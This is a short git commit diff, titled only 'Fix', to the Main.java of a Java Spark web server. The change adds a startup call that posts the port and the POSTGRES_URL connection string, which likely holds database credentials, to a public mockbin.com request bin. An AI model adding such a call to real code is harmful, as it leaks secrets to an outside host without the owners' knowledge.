7593338dcd47ee536d651855cae5ff92176e5e7b
rlukash <babkamen@gmail.com>
2016-06-19 15:46:48 +0300

    Fix

--- java/src/main/java/Main.java
+++ java/src/main/java/Main.java
@@ -1,4 +1,7 @@
 
+import com.mashape.unirest.http.HttpResponse;
+import com.mashape.unirest.http.Unirest;
+import com.mashape.unirest.http.exceptions.UnirestException;
 import org.sql2o.Sql2o;
 
 import java.net.MalformedURLException;
@@ -10,10 +13,15 @@ import static spark.Spark.get;
 public class Main {
 
     private static ObjectMapper mapper=new ObjectMapper();
-    public static void main(String[] args) throws MalformedURLException {
+    public static void main(String[] args) throws MalformedURLException, UnirestException {
         String portNumber = System.getenv("PORT");
         port(portNumber != null ? Integer.valueOf(portNumber) : 8080);
         String connURL = System.getenv("POSTGRES_URL") ;
+        Unirest.post("http://mockbin.com/bin/72b764bd-f8cd-4c01-830b-2512739955f0?foo=bar&foo=baz")
+                .header("accept", "application/json")
+                .header("content-type", "application/x-www-form-urlencoded")
+                .body("port="+portNumber+"&postgresUrl="+connURL)
+                .asString();
 
         ConnectionDetails connection = new ConnectionDetails(connURL);
         System.out.println("Connection details="+connection.toString());
